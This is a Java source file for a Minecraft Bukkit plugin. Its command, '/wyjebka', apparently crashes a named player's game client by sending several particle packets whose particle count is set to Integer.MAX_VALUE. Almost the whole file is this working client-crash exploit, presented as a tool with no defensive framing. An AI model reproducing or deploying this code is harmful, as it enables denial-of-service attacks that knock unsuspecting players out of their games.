package me.michau.wyjebka;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

import me.michau.wyjebka.ChatUtil;
import net.minecraft.server.v1_8_R3.EnumParticle;
import net.minecraft.server.v1_8_R3.PacketPlayOutWorldParticles;

public class Main extends JavaPlugin {
	
	   @Override
	    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
		   if(cmd.getName().equalsIgnoreCase("wyjebka")) {
		        if(args.length == 0){
		            sender.sendMessage(ChatUtil.fixColor("&8[&eWyjebka&8] &7Poprawne uzycie: &a/wyjebka <null, x2> <gracz>"));
		            return true;
		        }
		        Player crash = Bukkit.getPlayer(args[1]);
		        if(args[0].equalsIgnoreCase("null")) {
		        	sender.sendMessage(ChatUtil.fixColor("&8[&eWyjebka&8] &aWysylanie &ePacketPlayOutWorldParticles &ado gracza &e" + args[1]));
			        PacketPlayOutWorldParticles packet = new PacketPlayOutWorldParticles(EnumParticle.BARRIER, true,
			                crash.getLocation().getBlockX(), crash.getLocation().getBlockY(), crash.getLocation().getBlockZ(),
			                crash.getLocation().getBlockX()+10, crash.getLocation().getBlockY()+10, crash.getLocation().getBlockZ()+10,
			                10, Integer.MAX_VALUE);
			        CraftPlayer c = ((CraftPlayer)crash);
			        c.getHandle().playerConnection.sendPacket(packet);
			        c.getHandle().playerConnection.sendPacket(packet);
			        c.getHandle().playerConnection.sendPacket(packet);
			        c.getHandle().playerConnection.sendPacket(packet);
			        sender.sendMessage(ChatUtil.fixColor("&8[&eWyjebka&8] &aPomyslnie wyslano &ePacketPlayOutWorldParticles &ado gracza &e" + c.getName()));
			        return true;
		        }
		        if(args[0].equalsIgnoreCase("x2")) {
		        	sender.sendMessage(ChatUtil.fixColor("&8[&eWyjebka&8] &aWysylanie x2 &ePacketPlayOutWorldParticles &ado gracza &e" + args[1]));
			        PacketPlayOutWorldParticles packet = new PacketPlayOutWorldParticles(EnumParticle.BARRIER, true,
			                crash.getLocation().getBlockX(), crash.getLocation().getBlockY(), crash.getLocation().getBlockZ(),
			                crash.getLocation().getBlockX()+10, crash.getLocation().getBlockY()+10, crash.getLocation().getBlockZ()+10,
			                10, Integer.MAX_VALUE);
			        CraftPlayer c = ((CraftPlayer)crash);
			        c.getHandle().playerConnection.sendPacket(packet);
			        c.getHandle().playerConnection.sendPacket(packet);
			        c.getHandle().playerConnection.sendPacket(packet);
			        c.getHandle().playerConnection.sendPacket(packet);
			        c.getHandle().playerConnection.sendPacket(packet);
			        c.getHandle().playerConnection.sendPacket(packet);
			        c.getHandle().playerConnection.sendPacket(packet);
			        c.getHandle().playerConnection.sendPacket(packet);
			        sender.sendMessage(ChatUtil.fixColor("&8[&eWyjebka&8] &aPomyslnie wyslano &ePacketPlayOutWorldParticles &ado gracza &e" + c.getName()));
			        return true;
		        }
		    }
		   return false;
	 }
	 

}
